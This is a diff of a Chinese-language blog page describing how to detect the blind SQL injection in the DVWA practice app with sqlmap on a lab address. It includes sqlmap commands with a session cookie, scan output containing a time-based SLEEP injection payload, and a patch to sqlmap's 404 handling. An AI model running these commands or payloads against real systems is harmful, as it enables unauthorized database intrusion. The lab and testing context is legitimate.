@@ -132,21 +132,18 @@ ID</code>中的内容以get请求发送到服务器,例如在文本框中输入1
 
 <p>尝试用sqlmap跑出这个注入点,语句如下:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>sqlmap -u "http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#" --cookie='PHPSESSID=glgav33fgc0l1hoikg5f267j51;security=low'
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap -u "http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#" --cookie='PHPSESSID=glgav33fgc0l1hoikg5f267j51;security=low'
+</code></pre></div></div>
 
 <p>这样是可以跑出来的,但是要提高效率用工具自动发现这个漏洞时,一般这样用sqlmap:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>sqlmap -u "http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/" --forms --batch -v 3 --cookie='...'
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap -u "http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/" --forms --batch -v 3 --cookie='...'
+</code></pre></div></div>
 
 <p>由于这里的id参数的值通过爬虫无法获得,因为这个id参数的值是通过表单提交的,爬虫最多可得到的url为:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/?id=&amp;Submit=Submit#
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/?id=&amp;Submit=Submit#
+</code></pre></div></div>
 
 <p>上图中的<code class="highlighter-rouge">Submit</code>按钮对应的应该是js处理的动作,js将表单通过get请求发送到服务器,这种情况下,需要用selenium+phantomjs
 来获得上面的url(或者使用sqlmap中的<code class="highlighter-rouge">--forms</code>参数来捕获这样的表单),而就算得到了url,由于这个url中的<code class="highlighter-rouge">id=</code>,也即id值为空,
@@ -160,7 +157,7 @@ ID</code>中的内容以get请求发送到服务器,例如在文本框中输入1
 不带参数值的参数的注入点则要通过<code class="highlighter-rouge">or</code>来测试),也即要发挥sqlmap的功能最好设置<code class="highlighter-rouge">--batch --risk=3 --forms</code>.试试直接用这种
 方法测试上面的注入点(在dvwa中对应的页面为<code class="highlighter-rouge">http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/</code>):</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>/tmp/sqlmap [master] » python2 sqlmap.py -u "192.168.8.190/dvwa/vulnerabilities/sqli_blind/" --forms -v 3 --cookie='PHPSESSID=glgav33fgc0l1hoikg5f267j51;security=low' --risk 3 --batch
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/tmp/sqlmap [master] » python2 sqlmap.py -u "192.168.8.190/dvwa/vulnerabilities/sqli_blind/" --forms -v 3 --cookie='PHPSESSID=glgav33fgc0l1hoikg5f267j51;security=low' --risk 3 --batch
         ___
        __H__
  ___ ___[']_____ ___ ___  {1.1.8.6#dev}
@@ -201,38 +198,34 @@ do you want to fill blank fields with random values? [Y/n] Y
 [14:40:30] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/var/root/.sqlmap/output/results-08202017_0240pm.csv'
 
 [*] shutting down at 14:40:30
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>发现sqlmap跑不出来,尝试修改sqlmap代码,结果中有关键字<code class="highlighter-rouge">page not found (404)</code>,于是定位相关代码:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>cd /tmp/sqlmap &amp;&amp; grep -r "page not found" .
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /tmp/sqlmap &amp;&amp; grep -r "page not found" .
+</code></pre></div></div>
 
 <p>结果如下:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>./lib/request/connect.py:                    errMsg = "page not found (%d)" % code
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./lib/request/connect.py:                    errMsg = "page not found (%d)" % code
 ./lib/request/connect.py:                    debugMsg = "page not found (%d)" % code
 ./lib/utils/crawler.py:                    if "page not found" in getSafeExString(ex):
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>于是修改./lib/request/connect.py中代码:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>elif ex.code == httplib.NOT_FOUND:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>elif ex.code == httplib.NOT_FOUND:
     if raise404:
         errMsg = "page not found (%d)" % code
         raise SqlmapConnectionException(errMsg)
     else:
         debugMsg = "page not found (%d)" % code
         singleTimeLogMessage(debugMsg, logging.DEBUG)
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>将其中的raise SqlmapConnectionException(errMsg)注释掉后再重新用刚才的sqlmap语句测试可测出这个注入点,详情如下:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>/tmp/sqlmap [master●] » python2 sqlmap.py -u "192.168.8.190/dvwa/vulnerabilities/sqli_blind/" --forms -v 3 --cookie='PHPSESSID=glgav33fgc0l1hoikg5f267j51;security=low' --risk 3 --batch
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/tmp/sqlmap [master●] » python2 sqlmap.py -u "192.168.8.190/dvwa/vulnerabilities/sqli_blind/" --forms -v 3 --cookie='PHPSESSID=glgav33fgc0l1hoikg5f267j51;security=low' --risk 3 --batch
 [14:48:41] [DEBUG] checking for filtered characters
 [14:48:41] [PAYLOAD] OOFt' OR 6597=IF((3988&gt;3987),SLEEP(5),6597) AND 'sIjt'='sIjt
 GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
@@ -257,8 +250,7 @@ back-end DBMS: MySQL &gt;= 5.0.12
 '/var/root/.sqlmap/output/results-08202017_0246pm.csv'
 
 [*] shutting down at 14:49:06
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>已提交pull request到sqlmap,相关代码文件为<code class="highlighter-rouge">lib/request/connect.py</code>,<a href="https://github.com/sqlmapproject/sqlmap/pull/2663">follow</a></p>
 
@@ -299,16 +291,6 @@ back-end DBMS: MySQL &gt;= 5.0.12
 
 
 
-      
-<!--PC和WAP自适应版-->
-<div id="SOHUCS" style="width:980px"></div> 
-<script type="text/javascript"> 
-(function(){ 
-var appid = 'cyt1tnTcP'; 
-var conf = 'prod_a926ede5ea067744d582783ccd509c1f'; 
-var width = window.innerWidth || document.documentElement.clientWidth; 
-if (width < 960) { 
-window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="http://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("http://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })(); </script>
       
 
 
